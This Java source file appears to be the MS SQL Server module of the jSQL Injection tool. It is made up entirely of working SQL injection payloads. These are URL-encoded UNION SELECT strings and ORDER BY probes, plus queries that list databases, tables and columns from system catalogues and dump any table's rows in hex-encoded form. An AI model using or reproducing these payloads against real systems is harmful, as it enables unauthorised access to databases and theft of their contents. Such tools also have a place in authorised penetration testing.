package com.jsql.model.vendor;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class MSSQLServerStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()%2B'%01%03%03%07'";
    }

    @Override
    public String getSchemaList() {
        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+master..sysdatabases)x+" +
                        "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
    }

    @Override
    public String getTableList(Database database) {
        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+"+ database + "..sysobjects+WHERE+xtype='U')x+" +
                        "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
    }

    @Override
    public String getColumnList(Table table) {
        try {
            return
                "SELECT+" +
                    "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                        "(" +
                            "SELECT" +
                                "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                            "FROM+" +
                                "(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" +
                                    table.getParent() + "..syscolumns+c," +
                                    table.getParent() + "..sysobjects+t+" +
                                "WHERE+" +
                                    "c.id=t.id+" +
                                "AND+t.name='" + URLEncoder.encode(table.toString(), "UTF-8") + "')x+" +
                            "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
                        ")" +
                    ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",'')))%2bchar(127)%2bLTRIM(RTRIM(coalesce(");
        formatListColumn = "LTRIM(RTRIM(coalesce(" + formatListColumn + ",'')))";

        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(" + 
                                formatListColumn + 
                                "+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+*,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" + database + ".dbo." + table + ")x+" +
                        "where+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
        
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi$1',replicate(0x23,1024),'iLQS'))"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
    }

    @Override
    public String getDbLabel() {
        return null;
    }
}